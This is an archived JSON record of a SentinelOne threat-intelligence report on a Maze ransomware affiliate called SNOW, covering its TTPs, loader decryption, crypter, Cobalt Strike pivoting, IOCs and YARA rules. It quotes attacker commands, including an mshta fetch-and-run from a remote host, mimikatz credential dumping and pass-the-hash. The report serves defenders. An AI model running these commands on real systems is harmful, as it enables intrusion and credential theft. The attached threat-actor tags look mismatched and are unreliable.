{
    "id": "159aa60d-337e-4ddf-ad47-268b96c0c989",
    "created_at": "2023-01-12T15:02:49.440729Z",
    "updated_at": "2025-03-27T02:16:41.168315Z",
    "deleted_at": null,
    "sha1_hash": "bbe8343302686b3b42158c90efd770ced5c78070",
    "title": "2020-07-22 - Enter the Maze- Demystifying an Affiliate Involved in Maze (SNOW)",
    "authors": "",
    "file_creation_date": "2022-05-28T17:58:06Z",
    "file_modification_date": "2022-05-28T17:58:06Z",
    "file_size": 1349466,
    "plain_text": "# Enter the Maze: Demystifying an Affiliate Involved in Maze (SNOW)\n\n**[labs.sentinelone.com/enter-the-maze-demystifying-an-affiliate-involved-in-maze-snow/](https://labs.sentinelone.com/enter-the-maze-demystifying-an-affiliate-involved-in-maze-snow/)**\n\nJason Reaves\n\n**_Affiliate involved in Maze ransomware operations profiled from the actor perspective_**\n**_while also detailing their involvement in other groups._**\n\n_By Jason Reaves and Joshua Platt_\n\n## Executive Summary\n\nMaze continues to be one of the most dangerous and actively developed ransomware\nframeworks in the crimeware space.\nMaze affiliates utilize red team tools and frameworks but also a custom loader\ncommonly named DllCrypt[9].\nMaze affiliates utilize other malware and are involved with other high-end organized\ncrimeware groups conducting systematic corporate data breaches including Zloader,\nGozi and TrickBot as we will demonstrate in our profiling of Maze affiliate SNOW.\n\n## Background\n\nMaze ransomware became famous for moving from widespread machine locking to\ncorporate extortion with a blackmail component. Like most cybercrime groups, their intention\nis to maximize profits. As companies have adapted to the threat of ransomware by improving\n\n\n-----\n\nbackup solutions and adding more layers of protection, the ransomware actors would\nnoticeably see a hit in their returns as companies refused to pay. It makes sense then to add\nanother layer since you have already infiltrated the network to add a blackmail component by\nstealing sensitive data.\n\n## Research Insight\n\nMost of the existing research into Maze shows that it is frequently a secondary or tertiary\ninfection vector[8]. This means it is leveraged post initial access phase, frequently reported\nto be through RDP[5,6].\n\nTherefore, finding the loader being leveraged for delivering the Maze payload in memory is\nsomething that doesn’t happen very frequently. This loader has been leveraged in its\nunpacked form[9] being directly downloaded (hxxp://37[.]1.210[.]52/vologda.dll).\n\n**Server**\n\nWhile researching the custom loader, we discovered an active attack server leveraged by a\nMaze affiliate, SNOW.\n\n**Tools**\n\nGMER\nMimikatz\nMetasploit\nCobalt Strike\nPowerShell\nAdFind\nKoadic\nPowerShell Empire\n\n**Victimology**\n\nLawfirms\nDistributors and Resellers\n\n## TTPs\n\n**Initial Access**\n\nBruting T1078\nSMB exploitation T1190\nRDP T1133\n\n**Execution**\n\n\n-----\n\nwhoami /priv T1059\nwhoami /groups T1059\nklist T1059\nnet group “Enterprise Admins” /domain T1059\nnet group “Domain Admins” /domain T1059\nmshta http://x.x.x.x/ktfrJ T1059\npowershell Find-PSServiceAccounts T1059\n\n**Persistence & Privilege Escalation**\n\nelevate svc-exe T1035, T1050\nelevate uac-token-duplication T1088, T1093\njump psexec_psh T1035, T1050\n\n**Defense Evasion**\nProcess injection to hide beacon\n\ninject 24636 x64 T1055\n\n**Credential Access**\n\nmimikatz sekurlsa::logonpasswords T1003, T1055, T1093\nhashdump T1003, T1055, T1093\n\n**Discovery**\n\nportscan T1046\nnet share T1135, T1093\n\n**Lateral Movement**\n\nmimikatz sekurlsa::pth T1075, T1093\nSMB exploitation T1210\nNetwork shares T1021\nPsexec T1077\n\n## Attack Overview\n\nInitial access involved using an infected system with RDP opened to the internet for\nscanning, scanning performed was both SMB and RDP based.\n\nOnce the actor has an infected system, they will sometimes reuse it for further scanning\neither internally or externally.\n\nExample actor leveraging Metasploit for SMB scanning:\n\n\n-----\n\n```\nuse auxiliary/scanner/smb/smb_ms17_010\n\n```\n\nThe actor also leveraged Cobalt Strike on selected infections to perform RDP scanning using\nportscan.\n\nMultiple check-in logs indicated the beacon’s preferred stager parent was PowerShell.\n```\nprocess: powershell.exe; pid: 28068; os: Windows; version: 10.0; beacon\narch: x64 (x64)\n\n```\nMultiple systems the actor gained initial access to had no Administrator access, so the actor\nfrequently would then begin looking for other systems and mapping out the network (recon).\n\nThe actor was also very patient in these situations, choosing to focus on several persistence\npaths using multiple backdoors and waiting in the hopes that someone would login to the\nsystem with higher access. The actor would sometimes let these infections sit for 2-3 days\nbefore logging back in and checking them.\n\nIf the actor did have higher privileges, then they would frequently attempt to escalate using\nmethods outlined in the Privilege Escalation section of the TTP (Tactics, Techniques and\nProcedures) section. The actor would begin looking for other systems they could access\nusing existing credentials, mapped shares, other harvested credentials, or vulnerabilities.\n\n\n-----\n\nOnce the actor had mapped out the network and harvested credentials from normal\nworkstations, they would attempt to pivot to higher profile servers such as the domain\ncontroller.\n\nDue to the likelihood of the actor exfiltrating data or performing ransom activities the\ninvestigation ends here with the takedown of the server.\n\n## eCrime Overlaps\n\nBefore looking at the overlaps, we should explain that this actor uses a particular loader that\nis designed to detonate the onboard protected Maze file.\n\nMost of the loaders discovered start with a killswitch check, this loader immediately has one\nsuch string:\n\nIn the event that the file “C:AhnLabSucks” exists, then the DLL will print the message\n“Ahnlab really sucksn” and will then exit.\n\nIf it doesn’t exist, it begins allocating memory and copying over data:\n\n\n-----\n\nNext some hardcoded strings are loaded:\n\nEventually, this leads to a function call that is sitting in a loop along with a sub loop for\nXORing. This is a commonly seen code structure for encryption algorithms such as AES.\n\n\n-----\n\nThis, however, is not AES; it turns out to be Sosemanuk[7]. If you’ve never identified\nencryption or compression algorithms before, hardcoded values are a good place to try to\nidentify the encryption routine. Take for example this hardcoded DWORD value:\n\nSearching for this value led me to Sosemanuk source code, which I then compared with\nwhat I was seeing in the binary:\n\n\n-----\n\n```\n#define FSM(x0, x1, x2, x3, x4, x5, x6, x7, x8, x9)  do { \n                   unum32 tt, or1; \n                   tt = XMUX(r1, s ## x1, s ## x8); \n                   or1 = r1; \n                   r1 = T32(r2 + tt); \n                   tt = T32(or1 * 0x54655307); \n                   r2 = ROTL(tt, 7); \n                   PFSM; \n} while (0)\n\n```\nThere were also a number of hardcoded tables used:\n\nA search for ‘0xe19fcf13’ gets us hits for Sosemanuk source code, and we can find the\ntables pretty easily from the source:\n```\nstatic unum32 mul_a[] = {\n          0x00000000, 0xE19FCF13, 0x6B973726, 0x8A08F835,\n          0xD6876E4C, 0x3718A15F, 0xBD10596A, 0x5C8F9679,\n          0x05A7DC98, 0xE438138B, 0x6E30EBBE, 0x8FAF24AD,\n<..snip..>\nstatic unum32 mul_ia[] = {\n          0x00000000, 0x180F40CD, 0x301E8033, 0x2811C0FE,\n          0x603CA966, 0x7833E9AB, 0x50222955, 0x482D6998,\n          0xC078FBCC, 0xD877BB01, 0xF0667BFF, 0xE8693B32,\n<..snip..>\n\n```\nAfter downloading the source and building it into a shared object library, we can utilize this\nshared object file from Python. To test, I ripped out the small block of data that was copied\nover and then used the Sosemanuk python script that was provided by the package at\n[https://www.seanet.com/~bugbee/crypto/sosemanuk/.](https://www.seanet.com/~bugbee/crypto/sosemanuk/)\n\n\n-----\n\n```\n# python i pySosemanuk.py\npySosemanuk version: 0.01\n*** good ***\n>>> key = 'IDZT6frSHDHsfdsffiFduffz8GD7sddg'\n>>> iv = '832748zr89243zr7'\n>>> sm = Sosemanuk(key,iv)\n>>> data = open('small.bin', 'rb').read()\n>>> t = sm.decryptBytes(data)\n>>> t\n'[email protected]@[email protected]$xc7D$x04xaaxfcr|xe8qx01x00x00x83\n\n```\nThis turns out to be the code that will map a binary into memory:\n\nThere is also a larger chunk of data that will be copied over later:\n\n\n-----\n\nWe can hazard a guess this will be a PE file, but since the same Sosemanuk encryption key\nand IV will be utilized we can just decrypt and check:\n\n\n-----\n\n```\n# python i pySosemanuk.py\npySosemanuk version: 0.01\n*** good ***\n>>> key = 'IDZT6frSHDHsfdsffiFduffz8GD7sddg'\n>>> iv = '832748zr89243zr7'\n>>> sm = Sosemanuk(key,iv)\n>>> help(sm)\n>>> data = open('large.bin', 'rb').read()\n>>> t = sm.decryptBytes(data)\n>>> t[:100]\n'MZx90[email protected]x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00\n program cannot be'\n\n## Maze\n\n```\nAfter decrypting out the payload it is very easy to identify that it is a sample of Maze\nransomware:\n\nThere are two interesting overlaps involving this Maze Loader. The first is that one of the\nactor’s recovered samples was a crypted sample of a Maze loader with a certificate chain\nonboard from Sectigo for “BCJTJEJXDCZSKZPJGJ0”.\n\n\n-----\n\nPivoting on this chain leads us to a number of eCrime malware families that have been used\nfor delivering second stage malware previously.\n```\nGozi:\n4f61fcafad37cc40632ad85e4f8aa503d63700761e49db19c122bffa7084e4ec\nb9127a38c105987631df3a245c009dc9519bb790e27e8fd6de682b89f76d7db8\n6e5d049342c2fe60fad02a5ab494ff9d544e7952f67762dbd183f71f857b3e66\nbaea0b117de8a7f42ff04d69c648fe5ec7ae8ad886b6fa9e039d9d847577108d\nZloader:\n6fed2a5943e866a67e408a063589378ae4ce3aa2907cc58525a1b8f423284569\nZloader botnet: main\nGozi serpent keys: 7J79T4MEk8rkf3MT, 7EIrW8BoJ9xkYsKU, 21291029JSJUXMPP\n\n```\nAlso interesting is that the new Gozi being utilized by Gozi ConfCrew[10] uses one of these\nkeys for their loader service: ‘21291029JSJUXMPP’.\n\nSecondly, during our investigation of a packed sample of this loader, we noticed that it was\ndelivering Maze with a very distinctive crypter commonly associated with TrickBot.\n\n## TrickBot Crypter\n\nThe crypter being used here is one that is predominately utilized by TrickBot customers. The\nlatest variant is easy to identify due to its continued use of `VirtualAllocExNuma and a`\nmodified RC4 routine.\n\nThe string “383669855” is the ROR-13 hash of `VirtualAllocExNuma after being`\nuppcased.\n\n\n-----\n\n```\n>>> a virtualallocexnuma .upper()\n>>> a\n'VIRTUALALLOCEXNUMA'\n>>> h = 0\n>>> for c in a:\n...  h = ror(h, 13)\n...  h += ord(c)\n...\n>>> h\n383669855\n\n```\nAfter being resolved, it will be used to allocate a large chunk of memory and have the data\ncopied over.\n\nThe data will then be decrypted using a slightly modified version of RC4, the SBOX size is\nextended.\n\n\n-----\n\nAfter unpacking we are left with a DLL. This DLL turns out to be the Maze Loader that we\ndiscussed earlier.\n\nThis loader also has a certificate appended to it in the overlay data:\n\n\n-----\n\n```\nCertificate:\n     Data:\n          Version: 3 (0x2)\n          Serial Number:\n              02:ac:5c:26:6a:0b:40:9b:8f:0b:79:f2:ae:46:25:77\n          Signature Algorithm: sha1WithRSAEncryption\n          Issuer: C=US, O=DigiCert Inc, OU=www.digicert.com, CN=DigiCert High\nAssurance EV Root CA\n          Validity\n              Not Before: Nov 10 00:00:00 2006 GMT\n              Not After : Nov 10 00:00:00 2031 GMT\n          Subject: C=US, O=DigiCert Inc, OU=www.digicert.com, CN=DigiCert High\nAssurance EV Root CA\n          Subject Public Key Info:\n              Public Key Algorithm: rsaEncryption\n\n```\nThe overlay certificate even includes the WIN_CERTIFICATE structure, so it was possibly\nripped off a binary and then appended to the end of the file.\n\n## Finding Structure in Noise\n\nAs previously mentioned, we began tracking this actor’s attack servers, which predominantly\nleverage the use of Cobalt Strike. However, trying to pivot on a tool like Cobalt Strike can be\nchallenging, as you will get lost in a sea of data pretty quickly. It can be easy to simply look\nfor beacons using the same IOC and pivot on that, but that is naive so we decided to look for\nsome other ways. It’s worth mentioning that this is a very important reason why threat intel\nneeds reverse-engineers, providing a further technical look at the data to try to pivot on,\nmuch the same way an attacker or a pentester will try to pivot when looking at infrastructure:\nthe same techniques and approaches should be utilized in malware research bridging the\ntechnical gap of malware reverse-engineering with threat intel.\n\nThe Cobalt Strike beacons discovered here provide an excellent opportunity to showcase\nthis methodology using a real world example. Let’s take a recovered beacon from this\ninvestigation where the attacker was using the leaked version of Cobalt Strike.\n\n```\n'WATERMARK': '305419896'\n\n```\n\nThe above is the watermark value from the recovered Cobalt Strike beacon config. These\nvalues stored packed in a structure that is XOR encoded inside of the beacons. This data is\nsignaturable, however. Let’s take a look:\n```\n>>> b = struct.pack('>I', 305419896)\n>>> t.find(b)\n240590\n>>> t[240580:240600]\nbytearray(b'x00x00x00x00x00%x00x02x00x04x124Vxx00&x00x01x00x02')\n>>> chr(37)\n'%'\n>>> t2 = 'x00x00x00x00%x00x02x00x04x124Vx'\n\n```\n\n-----\n\n37 is the value used to designate the watermark value inside the beacon config. To pivot on\nthis data in OSINT, all we need to do is look for the data block above. For the purposes of\nexample, I will only show a simple example where we use the default XOR key for Cobalt\nStrike beacon configs:\n```\n>>> import binascii\n>>> binascii.hexlify(t2)\n'00000000250002000412345678'\n>>> t3 = bytearray(t2)\n>>> for i in range(len(t3)):\n...  t3[i] ^= 0x2e\n...\n>>> binascii.hexlify(t3)\n'2e2e2e2e0b2e2c2e2a3c1a7856'\n\n```\nTaking a look at the results in VirusTotal:\n\nSo now we have at least narrowed our sea of Cobalt Strike beacons down a bit to a pool of\n<100 samples.\n\nWhile looking at the config data for these beacons, we notice more trends that begin to stick\nout:\n\n\n-----\n\n```\nMozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\nMozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)\nMozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)\n\n```\nLeading to possibly more related infrastructure:\n\n```\n'SUBMITURI': '/submit.php', 'DOMAINS': '217.12.218[.]99,/ptj'\n\n```\n\nAnother interesting aspect of this watermark is that it shows up at the end of the PowerShell\nstager shellcode as well:\n\n```\nx00x00Pxc3xe8x9fxfdxffxff37.1.210[.]52x00x124Vx\")\n\n```\n\nAs mentioned, this leads to other infrastructure that could be used by either the affiliate or\nanother affiliate involved in Maze. The investigation is ongoing as the actors appear to be\nvery active.\n\n## Conclusion\n\nWe have covered in this paper tracking and profiling one of the actors involved in Maze\nransomware while also discovering intel of his involvement with multiple other major eCrime\nfamilies including Zloader, Gozi and TrickBot.\n\nThe notorious ransomware group, Maze, which leverages blackmail and data theft on top of\nfile locking is now found with evidence of an affiliate being involved in multiple major eCrime\ngroups and utilizing a service that is predominantly associated with TrickBot and their\ncustomers. Most of the major crimeware families have capabilities to deliver other files and\nthis means more things to think about for enterprise defenders as alerts are prioritized, dwell\ntime can be a gamble and it’s no longer safe to assume that you can expect an infection to\nact a certain way.\n\n**IOCs**\n\n**Unpacked samples:**\n\n85e38cc3b78cbb92ade81721d8cec0cb6c34f3b5\n\n07849ba4d2d9cb2d13d40ceaf37965159a53c852\n\n**IPs**\n\n37[.]1[.]210[.]52\n\n**Mitigation & Recommendations**\n\n**Endpoint**\n\nKillSwitch file: C:AhnLabSucks\n\n**YARA**\n\n\n-----\n\n```\nrule trick_crypter_vallocnuma_hash\n{\n     strings:\n          $a1 = “383669855”\n     condition: \n          all of them\n}\nrule Maze_Loader\n{\n     strings:\n          $sosemanuk_key = “IDZT6frSHDHsfdsffiFduffz8GD7sddg”\n          $ahnlab_messages1 = “Ahnlab really sucks”\n          $ahnlab_messages2 = “AhnLabSucks”\n     condition:\n          $sosemanuk_key or all of ($ahnlab_messages*)\n}\n\n## References\n\n```\n1: [https://blog.malwarebytes.com/threat-analysis/2016/10/trick-bot-dyrezas-successor/](https://blog.malwarebytes.com/threat-analysis/2016/10/trick-bot-dyrezas-successor/)\n\n2: [https://www.fidelissecurity.com/threatgeek/archive/trickbot-we-missed-you-dyre/](https://www.fidelissecurity.com/threatgeek/archive/trickbot-we-missed-you-dyre/)\n\n3: https://www.sentinelone.com/wp-content/uploads/the-deadly-planeswalker-how-thetrickbot-group-united-high-tech-crimeware-apt/\n\n4: https://www.sentinelone.com/wp-content/uploads/maze-ransomware-update-extortingand-exposing-victims/\n\n5: [https://threatpost.com/maze-ransomware-cognizant/154957/](https://threatpost.com/maze-ransomware-cognizant/154957/)\n\n6: [https://twitter.com/VK_Intel/status/1251388507219726338](https://twitter.com/VK_Intel/status/1251388507219726338)\n\n7: [https://www.seanet.com/~bugbee/crypto/sosemanuk/](https://www.seanet.com/~bugbee/crypto/sosemanuk/)\n\n8: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-proceduresassociated-with-maze-ransomware-incidents.html\n\n9: [https://twitter.com/malwrhunterteam/status/1265317887167926272](https://twitter.com/malwrhunterteam/status/1265317887167926272)\n\n10: https://www.sentinelone.com/wp-content/uploads/valak-malware-and-the-connection-togozi-loader-confcrew/\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-07-22 - Enter the Maze- Demystifying an Affiliate Involved in Maze (SNOW).pdf"
    ],
    "report_names": [
        "2020-07-22 - Enter the Maze- Demystifying an Affiliate Involved in Maze (SNOW).pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "6fbff48b-7a3e-4e54-ac22-b10f11e32337",
            "created_at": "2022-10-25T16:07:23.318008Z",
            "updated_at": "2025-03-27T02:02:09.734465Z",
            "deleted_at": null,
            "main_name": "APT 4",
            "aliases": [
                "APT 4",
                "Bronze Edison",
                "Maverick Panda",
                "Salmon Typhoo",
                "Sodium",
                "Sykipot",
                "TG-0623",
                "Wisp Team"
            ],
            "source_name": "ETDA:APT 4",
            "tools": [
                "Getkys",
                "Sykipot",
                "Wkysol",
                "XMRig"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535769,
    "ts_updated_at": 1743041801,
    "ts_creation_date": 1653760686,
    "ts_modification_date": 1653760686,
    "files": {
        "pdf": "https://archive.orkl.eu/bbe8343302686b3b42158c90efd770ced5c78070.pdf",
        "text": "https://archive.orkl.eu/bbe8343302686b3b42158c90efd770ced5c78070.txt",
        "img": "https://archive.orkl.eu/bbe8343302686b3b42158c90efd770ced5c78070.jpg"
    }
}